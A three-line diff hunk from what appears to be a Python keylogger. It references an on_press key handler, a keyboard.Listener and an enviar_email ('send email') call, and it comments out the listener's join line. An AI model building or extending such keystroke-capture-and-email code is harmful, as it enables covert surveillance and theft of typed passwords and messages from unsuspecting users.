@@ -49,5 +49,5 @@ def on_press(key):
 
 #with keyboard.Listener(on_press=on_press) as listener:
     #enviar_email()
+    #listener.join()
 
-    listener.join()
